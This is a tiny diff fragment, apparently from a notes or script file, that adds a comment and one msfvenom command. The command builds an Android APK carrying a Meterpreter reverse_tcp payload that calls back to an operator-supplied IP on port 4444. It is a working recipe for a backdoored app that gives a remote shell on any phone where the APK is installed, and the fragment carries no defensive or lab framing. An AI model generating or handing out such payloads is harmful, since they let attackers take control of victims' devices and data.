@@ -1,0 +1,2 @@
+# Generate APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 R > payload.apk
